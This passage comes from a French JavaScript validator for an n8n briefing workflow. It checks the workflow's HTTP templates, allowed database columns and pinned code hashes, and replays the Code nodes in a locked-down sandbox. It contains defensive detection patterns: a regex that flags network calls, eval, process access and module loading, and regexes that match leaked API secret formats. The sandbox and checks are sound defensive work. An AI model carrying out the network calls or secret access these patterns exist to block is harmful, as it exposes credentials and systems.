// Juge HORS LIGNE du workflow n8n `presti-briefing-matin` (chantier 4, lot L15, voie (a) de la question 2 ; tâche 032-013).
//
// Le briefing poussé chaque matin vit dans n8n (règle n8n-first, .claude/rules/architecture-outils.md) ; l'app garde composerBriefing
// (lib/assistant/briefing.ts:44) pour l'outil `briefing_du_matin` de l'assistant. Ce juge prouve que les deux disent la même chose,
// sans réseau, sans base, sans modèle. Il relit l'export (.orchestre/preuves/032-013/presti-briefing-matin.workflow.json) et :
//   1. la STRUCTURE : inactif, jamais publié ; seuls un Schedule Trigger à 7 h 30 (Europe/Paris), des HTTP Request en GET et des nœuds
//      Code ; le graphe entier, nœud par nœud ; chaque nœud HTTP comparé à un GABARIT EXACT (`parameters` ET `options`, noms et valeurs
//      des paramètres de requête, filtres et pagination compris : toute autre clé rougit) ; `select=` dans les colonnes permises (brief
//      plans/011-cadrage-01-11/briefs/c4-n8n-briefing-matin.md), aucune colonne nom, email, contact, adresse, message, contenu, texte,
//      ni `*`, ni jointure, ni alias ; `alwaysOutputData` exigé, aucun `onError` ; `settings` en liste blanche ; aucun secret ;
//   2. le CODE : l'empreinte SHA-256 de chaque `jsCode` est épinglée (toute différence : « nouvel audit requis ») ; le rejeu tourne dans
//      un PROCESSUS ENFANT `node --permission` sans aucune `--allow-*`, environnement vide, dans un contexte vm où tout global hors d'une
//      liste blanche ECMA est un piège, `this` un piège, l'horloge (Date.now, new Date()) refusée, génération de code et import() coupés ;
//   3. les COPIES : capacités = peut() de lib/plans.ts ; seuils = lib/assistant/briefing.ts ; limites = les lectures de l'app ;
//   4. les MÊMES PRIORITÉS QUE composerBriefing : sur les mêmes lignes fictives, le juge rejoue la vraie chaîne de l'app
//      (resumerConversations, resumerFactures, resumerStock, composerBriefing, importées ; les lectures de l'app et l'alerte de stock de
//      app/api/inventaire/route.ts:67-75 recopiées) et les nœuds Code de l'export (lectures HTTP simulées d'après leurs paramètres
//      exacts), puis exige mêmes rubriques, ordre, nombres, lignes non montrées, objets, urgences et chiffres. Cas fixes (a) à (l) et
//      plusieurs centaines de jeux tirés au hasard, à graine fixe ;
//   5. la SORTIE (liste blanche de clés ; toute chaîne : identifiant, date ISO, clé du point du jour ou énumération fermée ; aucun mot
//      interdit ni marque), l'ESSAI n8n rejoué hors ligne, le BRIEF (chaque colonne citée à la ligne de sa migration), la PREUVE ;
//   6. des MUTANTS, qui doivent tous faire rougir la suite (un mutant du code est jugé SANS les empreintes).
//
// Lancement : node --experimental-strip-types --import ./scripts/ts-loader.mjs scripts/briefing-n8n-qa.mjs
//   --pin-data : écrit sur la sortie les données épinglées de l'essai n8n (jeu ESSAI ci-dessous), rien d'autre.
// Bac à sable : construction reprise de scripts/detecteurs-n8n-qa.mjs:292-447 (032-012, rendue TIENT par l'audit 032-016), recopiée et
// durcie ici (liste blanche des globaux, horloge, import()), sans l'importer ni la modifier.
import { readFileSync, existsSync } from 'node:fs'
import { createHash } from 'node:crypto'
import { spawn } from 'node:child_process'
import path from 'node:path'
import { fileURLToPath } from 'node:url'
import { PLANS, peut } from '../lib/plans.ts'
import { composerBriefing, DEVIS_SANS_REPONSE_JOURS, IMPAYE_URGENT_JOURS } from '../lib/assistant/briefing.ts'
import { resumerConversations, resumerFactures, resumerStock } from '../lib/assistant/donnees.ts'
import { jourParis } from '../lib/comptaTableau.ts'

const RACINE = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..')
const PREUVES = path.join(RACINE, '.orchestre/preuves/032-013')
const FICHIERS = {
  export: path.join(PREUVES, 'presti-briefing-matin.workflow.json'),
  essai: path.join(PREUVES, 'essai.json'),
  brief: path.join(RACINE, 'plans/011-cadrage-01-11/briefs/c4-n8n-briefing-matin.md'),
  resume: path.join(PREUVES, 'resume.md'),
}
const MODE_PIN = process.argv.includes('--pin-data')
const lire = (f) => readFileSync(f, 'utf8')
const sha256 = (s) => createHash('sha256').update(String(s), 'utf8').digest('hex')
const copie = (o) => JSON.parse(JSON.stringify(o))
const canon = (v) => (Array.isArray(v) ? `[${v.map(canon).join(',')}]` : v && typeof v === 'object' ? `{${Object.keys(v).sort().map((k) => JSON.stringify(k) + ':' + canon(v[k])).join(',')}}` : JSON.stringify(v))
const egal = (a, b) => canon(a) === canon(b)
const memes = (a, b) => a.length === b.length && [...a].sort().join('|') === [...b].sort().join('|')
const clesExactes = (o, attendues) => !!o && typeof o === 'object' && !Array.isArray(o) && memes(Object.keys(o), attendues)

// ─── Ce que n8n a le droit de lire (brief, « Les colonnes permises ») ─────────────────────────────────────────────────────────
// Chaque colonne : une ligne de sa migration (vérifiée par `brief()`) et la ligne du rôle n8n_lecture qui l'accorde (0189:38-46).
const BASE = 'https://gorcdvmueakcncsmrouo.supabase.co/rest/v1/'
const IDENTIFIANT = { id: 'dTewDK98MLrNckNG', name: 'Supabase account' }
const PERMISES = {
  artisans: ['id', 'plan', 'est_demo', 'suppression_demandee_le'],
  leads: ['id', 'artisan_id', 'statut', 'urgence', 'lu_le', 'updated_at'],
  messages: ['lead_id', 'sens', 'etat', 'sent_at'],
  devis: ['id', 'artisan_id', 'statut', 'total_ttc', 'envoye_le'],
  factures: ['id', 'artisan_id', 'statut', 'date_emission', 'date_echeance', 'total_ttc', 'avoir_de'],
  materiaux: ['id', 'artisan_id', 'seuil_alerte'],
  stock: ['id', 'materiau_id', 'quantite'],
}
const GRANT_0189 = { artisans: 38, factures: 39, devis: 40, leads: 41, messages: 42, materiaux: 45, stock: 46 }
const COLONNE_INTERDITE = /nom|e-?mail|contact|adresse|message|contenu|texte/i
// Le vocabulaire banni devant l'artisan (plan du chantier 4, §7, l.523) et les marques (rang 23, l.101-102), plus « Presti » (marque blanche).
const MOTS_INTERDITS = ['agent', 'workflow', 'n8n', 'mcp', 'prompt', 'llm', 'détecteur', 'detecteur', 'opportunité', 'opportunite', 'file', 'modèle', 'modele',
  'hermes', 'orca', 'claude', 'anthropic', 'opus', 'sonnet', 'haiku', 'gpt', 'openai', 'supabase', 'presti']
// Les motifs de secrets de scripts/garde-commit.mjs:16-26 (recopiés, avec leur source).
const SECRETS = [/sk_live_[A-Za-z0-9]{8,}/, /sk-ant-[A-Za-z0-9_-]{12,}/, /eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9\.[A-Za-z0-9_-]{20,}/, /sb_secret_[A-Za-z0-9_-]{12,}/, /rk_live_[A-Za-z0-9]{8,}/]
const UUID = /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/
const UUID_INVENTE = /^00000000-0000-4000-8000-[0-9a-f]{12}$/
const REPLI = '00000000-0000-0000-0000-000000000000'

// ─── Le graphe attendu, nœud par nœud (une chaîne, rien après le bilan) ───────────────────────────────────────────────────────
const DECLENCHEUR = 'Déclencheur 7 h 30'
const T = { declencheur: 'n8n-nodes-base.scheduleTrigger', http: 'n8n-nodes-base.httpRequest', code: 'n8n-nodes-base.code', note: 'n8n-nodes-base.stickyNote' }
const CHAINE = [
  [DECLENCHEUR, T.declencheur], ['Contexte du passage', T.code], ['Capacités des offres', T.code], ['Lire comptes', T.http], ['Comptes retenus', T.code],
  ['Lire demandes', T.http], ['Paquets de demandes ouvertes', T.code], ['Lire messages', T.http], ['Lire devis envoyés', T.http], ['Lire factures', T.http],
  ['Lire matériaux suivis', T.http], ['Lire stock', T.http], ['Contrôle des lectures', T.code], ['Conversations qui attendent', T.code],
  ['Devis sans réponse', T.code], ['Impayés', T.code], ['Stock sous le seuil', T.code], ['Point du jour par compte', T.code], ['Bilan du passage', T.code],
]
const DECLENCHEUR_ATTENDU = { rule: { interval: [{ field: 'days', daysInterval: 1, triggerAtHour: 7, triggerAtMinute: 30 }] } }
// 032-033 (audit 032-029, B-1 et B-2) : la liste blanche s'ouvre à ces seules clés et valeurs — le workflow d'erreur commun
// presti-erreurs (AQeHiC58UgbMR4Kr), les succès non gardés, les échecs gardés (leur durée est la purge de l'instance, à régler par Benj).
const PRESTI_ERREURS = 'AQeHiC58UgbMR4Kr'
const REGLAGES = { executionOrder: 'v1', timezone: 'Europe/Paris', availableInMCP: true, saveDataSuccessExecution: 'none', saveDataErrorExecution: 'all', errorWorkflow: PRESTI_ERREURS }

// ─── É1 : le gabarit EXACT de chaque nœud HTTP (celui de « Lire factures » du lot L3, .orchestre/preuves/032-003) ─────────────────
const COMPTES_DU_PASSAGE = "={{ 'in.(' + $('Comptes retenus').first().json.ids + ')' }}"
const DU_PAQUET = "={{ 'in.(' + $json.lead_ids + ')' }}"
const DES_MATERIAUX = "={{ 'in.(' + ($('Lire matériaux suivis').all().map(i => i.json.id).filter(Boolean).join(',') || '00000000-0000-0000-0000-000000000000') + ')' }}"
const PAGINATION = { pagination: { paginationMode: 'updateAParameterInEachRequest', parameters: { parameters: [{ type: 'qs', name: 'offset', value: '={{ $pageCount * 1000 }}' }] },
  paginationCompleteWhen: 'other', completeExpression: '={{ !Array.isArray($response.body) || $response.body.length < 1000 }}', limitPagesFetched: true, maxRequests: 50 } }
const GABARITS = {
  'Lire comptes': { table: 'artisans', requete: [['select', 'id,plan,est_demo,suppression_demandee_le'], ['plan', 'in.(studio,signature,entreprise)'], ['est_demo', 'is.false'], ['suppression_demandee_le', 'is.null'], ['order', 'id'], ['limit', '1000']] },
  'Lire demandes': { table: 'leads', requete: [['select', 'id,artisan_id,statut,urgence,lu_le,updated_at'], ['artisan_id', COMPTES_DU_PASSAGE], ['order', 'id'], ['limit', '1000']] },
  // Les messages : leur propre gabarit, celui de l'app (lib/assistant/executeurs.ts:170-172) — un appel par paquet de 100 demandes
  // ouvertes (pas d'executeOnce), états vide ou `proposition`, les plus récents d'abord, 1 000 au plus, sans pagination.
  'Lire messages': { table: 'messages', unParPaquet: true, requete: [['select', 'lead_id,sens,etat,sent_at'], ['lead_id', DU_PAQUET], ['or', '(etat.is.null,etat.eq.proposition)'], ['order', 'sent_at.desc'], ['limit', '1000']] },
  'Lire devis envoyés': { table: 'devis', requete: [['select', 'id,artisan_id,statut,total_ttc,envoye_le'], ['artisan_id', COMPTES_DU_PASSAGE], ['statut', 'eq.envoye'], ['order', 'id'], ['limit', '1000']] },
  'Lire factures': { table: 'factures', requete: [['select', 'id,artisan_id,statut,date_emission,date_echeance,total_ttc,avoir_de'], ['artisan_id', COMPTES_DU_PASSAGE], ['order', 'id'], ['limit', '1000']] },
  'Lire matériaux suivis': { table: 'materiaux', requete: [['select', 'id,artisan_id,seuil_alerte'], ['artisan_id', COMPTES_DU_PASSAGE], ['seuil_alerte', 'gt.0'], ['order', 'id'], ['limit', '1000']] },
  'Lire stock': { table: 'stock', requete: [['select', 'id,materiau_id,quantite'], ['materiau_id', DES_MATERIAUX], ['order', 'id'], ['limit', '1000']] },
}
const parametresAttendus = (g) => ({
  method: 'GET', url: BASE + g.table, authentication: 'predefinedCredentialType', nodeCredentialType: 'supabaseApi', sendQuery: true, specifyQuery: 'keypair',
  queryParameters: { parameters: g.requete.map(([name, value]) => ({ name, value })) },
  options: g.unParPaquet ? { timeout: 30000 } : { timeout: 30000, pagination: copie(PAGINATION) },
})
const FILTRES_SANS_COLONNE = new Set(['select', 'order', 'limit', 'or'])

// ─── É3 (a) : l'empreinte SHA-256 du code de chaque nœud Code, tel qu'audité ───────────────────────────────────────────────────
// Une différence n'est pas une erreur du juge : c'est un code que personne n'a relu. Nouvel audit par un agent distinct, puis nouvelle
// empreinte ici (sha256 du champ `parameters.jsCode` de l'export, en UTF-8).
const EMPREINTES = new Map([
  ['Contexte du passage', 'd4a4f6c4cea7d4000a7447ab4cb1636253f4eb23b1512631034298298cda9637'],
  ['Capacités des offres', '911cee5634e45cfe3e96db92f888a60f9667b1349d2ffc5ec0c6f13e6d25cdcd'],
  ['Comptes retenus', '8cf5f8a1d1955d00302a5f3dfeb5a6aea2f7ee7017a545556325c8dcfca96b7f'],
  ['Paquets de demandes ouvertes', '3cc2729dd6afb4bbd2584113fbff4ecc57945c2e6f7cec1fe5722c9f59f0b0da'],
  ['Contrôle des lectures', '412fdbbc299ec09065741faed457c5548c47a5848c9e062765fb4eae063e0697'],
  ['Conversations qui attendent', 'ba293da600889bebea215efa3d5906329d8154c95447655dae22a4c184034e9b'],
  ['Devis sans réponse', 'bff134ccea507cdced9ecd711e86b265e70b51b67d550b74a01b445970b46efd'],
  ['Impayés', 'd607ab2ef6f7184478a0d89f1516b471cb6ea10f783ea15a39c34d7ed3278be0'],
  ['Stock sous le seuil', 'bad419ce7fc7b62f95ca21b07371bd88521cafd82b50f91dc7a3b5948eccb6c0'],
  ['Point du jour par compte', '1ed5db25ce1f2b07b81a95646df15d02b1958d99cba531f0cb4bd5212324a43b'],
  ['Bilan du passage', 'd3c7a527535e8c16708ac9094123cf4dc7dd2d3be60f4d0c98cd9875caa353c9'],
])
// Premier filet, bon marché, sur le texte du code : il se contourne par une concaténation ; les vraies barrières sont l'empreinte et
// le bac à sable. L'horloge aussi : l'instant ne vient que du déclencheur (le juge doit pouvoir le fixer).
const CODE_INTERDIT = /fetch\s*\(|httpRequest|\$http|require\s*\(|\bimport\s*\(|\bimport\s|axios|helpers|getWorkflowStaticData|\$execution|\$env|\$vars|\$secrets|\$now|\$today|\bDateTime\b|\$jmespath|Date\.now|new Date\(\s*\)|\.format\(\s*\)|formatToParts\(\s*\)|process\.|globalThis|\bthis\b|\beval\b|Function\s*\(|XMLHttpRequest|WebSocket|setTimeout|setInterval/
const DECISION_PAR_OFFRE = /plan\s*[!=]==?\s*['"]|['"](studio|signature|entreprise)['"]\s*[!=]==?/

const noeud = (wf, nom) => wf.nodes.find((n) => n.name === nom)
const codeDe = (wf, nom) => { const n = noeud(wf, nom); if (!n || typeof n.parameters?.jsCode !== 'string') throw new Error(`nœud Code absent : ${nom}`); return n.parameters.jsCode }

// ─── 1. Structure ──────────────────────────────────────────────────────────────────────────────────────────────────────────────
function structure(wf, { filtreTexte = true } = {}) {
  const e = []
  const ko = (m) => e.push(m)
  if (wf.active !== false) ko('le workflow doit être inactif (active: false)')
  if (wf.activeVersionId) ko('le workflow ne doit avoir aucune version publiée (activeVersionId)')
  if (wf.isArchived) ko('le workflow ne doit pas être archivé')
  if (wf.name !== 'presti-briefing-matin') ko(`nom inattendu : ${wf.name}`)
  if (wf.pinData && Object.keys(wf.pinData).length) ko('aucune donnée épinglée ne doit rester dans le workflow')
  if (!clesExactes(wf.settings, Object.keys(REGLAGES))) ko(`réglages du workflow hors liste blanche (${Object.keys(wf.settings ?? {}).join(', ')}) : ${Object.keys(REGLAGES).join(', ')} seulement`)
  for (const [k, v] of Object.entries(REGLAGES)) if (wf.settings?.[k] !== v) ko(`réglage settings.${k} : ${JSON.stringify(v)} attendu`)
  for (const k of Object.keys(wf.settings ?? {})) if (!(k in REGLAGES)) ko(`réglage du workflow non permis : settings.${k}`)
  const texte = JSON.stringify(wf)
  for (const re of SECRETS) if (re.test(texte)) ko(`secret dans l'export (motif ${re.source.slice(0, 12)}…)`)

  const attendus = new Map(CHAINE)
  const vus = new Set()
  for (const n of wf.nodes ?? []) {
    if (n.type === T.note) {
      if (!clesExactes(n, ['id', 'name', 'type', 'typeVersion', 'position', 'parameters'])) ko(`${n.name} : note hors gabarit`)
      if (Object.keys(n.parameters ?? {}).some((k) => !['content', 'height', 'width', 'color'].includes(k))) ko(`${n.name} : paramètres de note hors gabarit`)
      continue
    }
    if (!attendus.has(n.name)) { ko(`nœud inattendu : ${n.name} (${n.type})`); continue }
    if (vus.has(n.name)) ko(`nœud en double : ${n.name}`)
    vus.add(n.name)
    if (n.type !== attendus.get(n.name)) ko(`${n.name} : type ${n.type}, ${attendus.get(n.name)} attendu`)
    const clesPermises = n.type === T.http ? ['id', 'name', 'type', 'typeVersion', 'position', 'parameters', 'credentials', 'alwaysOutputData', ...(GABARITS[n.name]?.unParPaquet ? [] : ['executeOnce'])] : ['id', 'name', 'type', 'typeVersion', 'position', 'parameters']
    for (const k of Object.keys(n)) if (!clesPermises.includes(k)) ko(`${n.name} : clé de nœud non permise (${k})`)
    if (n.disabled) ko(`nœud désactivé : ${n.name}`)
  }
  for (const [nom] of CHAINE) if (!vus.has(nom)) ko(`nœud manquant : ${nom}`)

  const d = noeud(wf, DECLENCHEUR)
  if (d && (d.typeVersion !== 1.4 || !egal(d.parameters, DECLENCHEUR_ATTENDU))) ko('déclencheur : Schedule Trigger 1.4, tous les jours à 7 h 30 (fuseau du workflow), paramètres exacts attendus')

  for (const n of (wf.nodes ?? []).filter((x) => x.type === T.http)) http(n, ko)
  for (const n of (wf.nodes ?? []).filter((x) => x.type === T.code)) {
    const p = n.parameters ?? {}
    if (n.typeVersion !== 2) ko(`${n.name} : Code 2 attendu`)
    if (!clesExactes(p, ['mode', 'language', 'jsCode'])) ko(`${n.name} : paramètres du nœud Code hors gabarit (${Object.keys(p).join(', ')})`)
    if (p.mode !== 'runOnceForAllItems' || p.language !== 'javaScript') ko(`${n.name} : JavaScript, runOnceForAllItems attendu`)
    if (filtreTexte && CODE_INTERDIT.test(p.jsCode ?? '')) ko(`${n.name} : appel réseau, module, horloge, état persistant ou \`this\` interdit dans un nœud Code (${(p.jsCode ?? '').match(CODE_INTERDIT)[0]})`)
    if (DECISION_PAR_OFFRE.test(p.jsCode ?? '')) ko(`${n.name} : décision par le nom de l'offre (plan === …) interdite : lire la copie des capacités`)
  }

  // Le graphe ENTIER : chaque nœud a exactement une sortie vers le suivant, le bilan aucune ; aucune autre connexion.
  const connexions = wf.connections ?? {}
  for (const k of Object.keys(connexions)) if (!attendus.has(k)) ko(`connexion depuis un nœud inattendu : ${k}`)
  CHAINE.forEach(([nom], i) => {
    const suivant = CHAINE[i + 1]?.[0]
    const c = connexions[nom]
    if (!suivant) { if (c && Object.values(c).flat(2).length) ko(`rien ne doit suivre ${nom}`); return }
    if (!clesExactes(c, ['main']) || !egal(c.main, [[{ node: suivant, type: 'main', index: 0 }]])) ko(`connexion attendue : ${nom} → ${suivant}, et rien d'autre`)
  })
  return e
}

/** É1 : un nœud HTTP, d'abord lu (ce qu'il demande), puis comparé à son gabarit exact. */
function http(n, ko) {
  const p = n.parameters ?? {}
  const g = GABARITS[n.name]
  const m = String(p.method ?? 'GET').toUpperCase()
  if (m !== 'GET') ko(`${n.name} : méthode ${m} interdite (GET seulement)`)
  if (p.sendBody || 'body' in p || 'bodyParameters' in p || 'jsonBody' in p) ko(`${n.name} : un corps de requête est interdit`)
  if (p.sendHeaders || 'headerParameters' in p) ko(`${n.name} : aucun en-tête n'est permis`)
  if (n.onError) ko(`${n.name} : onError interdit (une lecture en erreur arrête le passage)`)
  if (n.alwaysOutputData !== true) ko(`${n.name} : alwaysOutputData attendu (une table vide rend un élément vide, vérifié par le code)`)
  const url = String(p.url ?? '')
  const table = url.startsWith(BASE) ? url.slice(BASE.length) : null
  if (!table || !PERMISES[table]) ko(`${n.name} : adresse hors des tables permises de l'API REST du projet (${url})`)
  const params = Array.isArray(p.queryParameters?.parameters) ? p.queryParameters.parameters : []
  const select = params.filter((q) => q.name === 'select')
  if (select.length !== 1) ko(`${n.name} : un seul select= attendu`)
  for (const q of select) {
    const v = String(q.value)
    if (/[*():!.]|\s/.test(v)) ko(`${n.name} : select= sans *, jointure, alias ni conversion (${v})`)
    for (const c of v.split(',')) {
      if (table && PERMISES[table] && !PERMISES[table].includes(c)) ko(`${n.name} : colonne ${table}.${c} hors de la liste permise`)
      if (COLONNE_INTERDITE.test(c)) ko(`${n.name} : colonne interdite ${c}`)
    }
  }
  for (const q of params) {
    if (FILTRES_SANS_COLONNE.has(q.name)) continue
    if (table && PERMISES[table] && !PERMISES[table].includes(q.name)) ko(`${n.name} : filtre sur une colonne non permise (${q.name})`)
  }
  if (table && !['artisans', 'messages', 'stock'].includes(table) && !params.some((q) => q.name === 'artisan_id' && q.value === COMPTES_DU_PASSAGE)) ko(`${n.name} : lecture non filtrée par les comptes du passage`)
  if (!g) { ko(`${n.name} : aucun gabarit pour ce nœud HTTP`); return }
  if (n.typeVersion !== 4.5) ko(`${n.name} : HTTP Request 4.5 attendu (${n.typeVersion})`)
  if (g.unParPaquet ? n.executeOnce !== undefined && n.executeOnce !== false : n.executeOnce !== true) ko(`${n.name} : executeOnce ${g.unParPaquet ? 'absent (un appel par paquet)' : 'attendu'}`)
  if (!clesExactes(n.credentials, ['supabaseApi']) || !egal(n.credentials.supabaseApi, IDENTIFIANT)) ko(`${n.name} : un seul identifiant, supabaseApi « Supabase account » (${IDENTIFIANT.id}), attendu`)
  const a = parametresAttendus(g)
  if (!clesExactes(p, Object.keys(a))) ko(`${n.name} : paramètres HTTP hors gabarit (${Object.keys(p).join(', ')})`)
  for (const k of Object.keys(a)) {
    if (k === 'options') continue
    if (!egal(p[k], a[k])) ko(`${n.name} : paramètre ${k} hors gabarit${k === 'queryParameters' ? ' (noms, valeurs et ordre des paramètres de requête, filtres compris)' : ''}`)
  }
  const o = p.options
  if (!clesExactes(o, Object.keys(a.options))) ko(`${n.name} : options HTTP hors gabarit (${o && typeof o === 'object' ? Object.keys(o).join(', ') : typeof o}) : ${Object.keys(a.options).join(' et ')} seulement`)
  else {
    if (o.timeout !== 30000) ko(`${n.name} : options.timeout de 30 000 ms attendu`)
    if ('pagination' in a.options && !egal(o.pagination, a.options.pagination)) ko(`${n.name} : pagination hors gabarit (offset seul, pages de 1 000, fin exacte, 50 pages au plus)`)
  }
}

/** É3 (a) : le code jugé est le texte audité, à l'octet près. */
function empreintes(wf) {
  const e = []
  const codes = (wf.nodes ?? []).filter((n) => n.type === T.code)
  for (const n of codes) {
    const attendue = EMPREINTES.get(n.name)
    const vue = sha256(n.parameters?.jsCode ?? '')
    if (!attendue) e.push(`${n.name} : nœud Code sans empreinte épinglée — nouvel audit requis`)
    else if (vue !== attendue) e.push(`${n.name} : code différent de celui audité (sha256 ${vue.slice(0, 12)}…, épinglé ${attendue.slice(0, 12)}…) — nouvel audit requis`)
  }
  for (const nom of EMPREINTES.keys()) if (!codes.some((n) => n.name === nom)) e.push(`${nom} : nœud Code épinglé absent de l'export — nouvel audit requis`)
  return e
}

// ─── Le simulateur de PostgREST (code du juge, de confiance) ───────────────────────────────────────────────────────────────────
// Une fonction pure, sérialisée par `toString` pour tourner aussi dans le processus enfant. Elle sert aux DEUX côtés : les lectures de
// l'app (recopiées de lib/assistant/executeurs.ts, app/api/compta/tableau/route.ts, app/api/inventaire/route.ts) et les nœuds HTTP de
// l'export, lus d'après leurs paramètres exacts (les seules expressions comprises sont celles des gabarits ; toute autre est refusée).
// Postgres : tri croissant vides en dernier, décroissant vides d'abord (défauts de Postgres) ; à égalité, l'identifiant (le juge suppose
// que la base départage ainsi les ex æquo ; écart déclaré au brief). Le serveur rend 1 000 lignes au plus par requête.
function simulateur(expressions) {
  const TYPES = { updated_at: 'ts', sent_at: 'ts', envoye_le: 'ts', lu_le: 'ts', suppression_demandee_le: 'ts', date_emission: 'date', date_echeance: 'date',
    total_ttc: 'num', seuil_alerte: 'num', quantite: 'num' }
  const cleTs = (s) => {
    if (typeof s !== 'string') return null
    const m = /^(.*T\d{2}:\d{2}:\d{2})(?:\.(\d+))?(.*)$/.exec(s)
    const base = Date.parse(m ? m[1] + m[3] : s)
    return Number.isFinite(base) ? base * 1000 + (m && m[2] ? Number(m[2].padEnd(6, '0').slice(0, 6)) : 0) : null
  }
  const valeur = (col, v) => (v === null || v === undefined ? null : TYPES[col] === 'ts' ? cleTs(v) : TYPES[col] === 'num' ? Number(v) : String(v))
  const cmp = (a, b) => (a < b ? -1 : a > b ? 1 : 0)
  const accepte = (l, [col, op, v]) => {
    const x = l[col]
    if (op === 'eq') return x !== null && x !== undefined && String(x) === String(v)
    if (op === 'in') return x !== null && x !== undefined && v.includes(String(x))
    if (op === 'is') return v === null ? x === null || x === undefined : x === v
    if (op === 'gt') return x !== null && x !== undefined && Number(x) > Number(v)
    if (op === 'etat_vide_ou_proposition') return x === null || x === undefined || x === 'proposition'
    throw new Error('filtre inconnu du simulateur : ' + op)
  }
  /** Une requête sur une table : filtres [[col, op, v]], ordre [[col, desc, videsDabord]], puis l'identifiant ; offset, limite, colonnes. */
  function requete(lignes, { filtres = [], ordre = [], offset = 0, limite = Infinity, colonnes = null } = {}) {
    const r = lignes.filter((l) => filtres.every((f) => accepte(l, f)))
      .sort((a, b) => cmp(String(a.id ?? ''), String(b.id ?? '')))
      .sort((a, b) => {
        for (const [col, desc, videsDabord] of ordre) {
          const x = valeur(col, a[col]), y = valeur(col, b[col])
          if (x === null && y === null) continue
          if (x === null || y === null) return (x === null) === videsDabord ? -1 : 1
          const c = cmp(x, y)
          if (c) return desc ? -c : c
        }
        return 0
      })
      .slice(offset, offset + limite)
    return colonnes ? r.map((l) => Object.fromEntries(colonnes.map((c) => [c, l[c] === undefined ? null : l[c]]))) : r.map((l) => ({ ...l }))
  }
  /** Ce qu'un nœud HTTP de l'export aurait rendu, d'après ses paramètres exacts : la liste des lignes (avant alwaysOutputData). */
  function lectureHttp(db, nomNoeud, parametres, entree, sorties, base) {
    const url = String(parametres.url ?? '')
    if (!url.startsWith(base)) throw new Error(nomNoeud + ' : adresse hors du simulateur')
    const table = url.slice(base.length)
    if (!Array.isArray(db[table])) throw new Error(nomNoeud + ' : table inconnue du simulateur : ' + table)
    const pagine = !!parametres.options?.pagination
    const parElement = (item) => {
      let colonnes = null, ordre = [], limite = 1000
      const filtres = []
      for (const { name, value } of parametres.queryParameters?.parameters ?? []) {
        let v = String(value)
        if (v.startsWith('=')) {
          const f = expressions[v]
          if (!f) throw new Error(nomNoeud + ' : expression inconnue du simulateur (' + v.slice(0, 60) + ')')
          v = f(item, sorties)
        }
        if (name === 'select') colonnes = v.split(',')
        else if (name === 'order') ordre = v.split(',').map((o) => { const [col, sens] = o.split('.'); return [col, sens === 'desc', sens === 'desc'] })
        else if (name === 'limit') limite = Math.min(1000, Number(v))
        else if (name === 'or') { if (v !== '(etat.is.null,etat.eq.proposition)') throw new Error(nomNoeud + ' : filtre or inconnu'); filtres.push(['etat', 'etat_vide_ou_proposition']) }
        else if (v.startsWith('eq.')) filtres.push([name, 'eq', v.slice(3)])
        else if (v.startsWith('in.(') && v.endsWith(')')) filtres.push([name, 'in', v.slice(4, -1).split(',')])
        else if (v === 'is.null') filtres.push([name, 'is', null])
        else if (v === 'is.false' || v === 'is.true') filtres.push([name, 'is', v === 'is.true'])
        else if (v.startsWith('gt.')) filtres.push([name, 'gt', v.slice(3)])
        else throw new Error(nomNoeud + ' : filtre illisible pour le simulateur (' + name + '=' + v + ')')
      }
      if (!pagine) return requete(db[table], { filtres, ordre, limite, colonnes })
      const pg = parametres.options.pagination.pagination
      const toutes = []
      for (let page = 0; page < pg.maxRequests; page++) {
        const r = requete(db[table], { filtres, ordre, offset: page * 1000, limite, colonnes })
        toutes.push(...r)
        if (r.length < 1000) break
      }
      return toutes
    }
    return entree.flatMap((item) => parElement(item))
  }
  return { requete, lectureHttp, cleTs }
}
// Les seules expressions que le simulateur comprend : celles des gabarits, à la lettre.
const EXPRESSIONS_SOURCE = `({
  ${JSON.stringify(COMPTES_DU_PASSAGE)}: (item, sorties) => 'in.(' + sorties['Comptes retenus'][0].ids + ')',
  ${JSON.stringify(DU_PAQUET)}: (item) => 'in.(' + item.lead_ids + ')',
  ${JSON.stringify(DES_MATERIAUX)}: (item, sorties) => 'in.(' + (sorties['Lire matériaux suivis'].map((j) => j.id).filter(Boolean).join(',') || '${REPLI}') + ')',
})`
const SIM = simulateur((0, eval)(EXPRESSIONS_SOURCE))

// ─── É3 (b) : le bac à sable du rejeu (construction de scripts/detecteurs-n8n-qa.mjs:292-447, durcie) ──────────────────────────
// Ce corps tourne dans le PROCESSUS ENFANT (sérialisé par `toString`, passé à `node -e` : l'enfant n'a besoin d'aucun fichier), lancé
// `--permission` sans aucune `--allow-*` (ni lecture ni écriture disque, ni processus, ni worker, ni module natif),
// `--disallow-code-generation-from-strings`, environnement vide. Chaque nœud Code a un contexte vm neuf (`DONT_CONTEXTIFY`) : les données
// y entrent en TEXTE JSON. Durcissements de l'audit 032-016 (défaut moyen n° 1) : tout global du contexte hors d'une LISTE BLANCHE ECMA
// devient un piège (au lieu d'une liste noire liée à la version de Node), et la sonde échoue si un global n'a pas pu être piégé ;
// l'horloge (Date.now, new Date() sans argument) est refusée ; import() est noté et refusé. Node 24 n'a pas de barrage réseau dans
// `--permission` : c'est ce contexte, sans aucun objet de l'hôte, qui coupe fetch et process (mutants et évasions plus bas).
function enfant(simulateur, expressions) {
  'use strict'
  const vm = require('node:vm')
  const fs = require('node:fs')
  const os = require('node:os')
  const chemin = require('node:path')
  const processus = require('node:child_process')
  const fils = require('node:worker_threads')
  const reseau = require('node:net')
  const SIM = simulateur(expressions)
  for (const k of ['fetch', 'WebSocket', 'EventSource', 'XMLHttpRequest', 'require', 'module']) { try { delete globalThis[k] } catch { /* rien */ } }
  for (const k of ['getBuiltinModule', 'binding', '_linkedBinding', 'dlopen']) { try { process[k] = undefined } catch { /* rien */ } }

  // La liste blanche : les globaux de la norme ECMAScript, rien d'autre (ni console, ni minuterie, ni API web, ni Node).
  const PERMIS = ['globalThis', 'Infinity', 'NaN', 'undefined', 'isFinite', 'isNaN', 'parseFloat', 'parseInt', 'decodeURI', 'decodeURIComponent', 'encodeURI',
    'encodeURIComponent', 'escape', 'unescape', 'Array', 'ArrayBuffer', 'BigInt', 'BigInt64Array', 'BigUint64Array', 'Boolean', 'DataView', 'Date', 'Error',
    'EvalError', 'AggregateError', 'FinalizationRegistry', 'Float16Array', 'Float32Array', 'Float64Array', 'Int8Array', 'Int16Array', 'Int32Array', 'Intl',
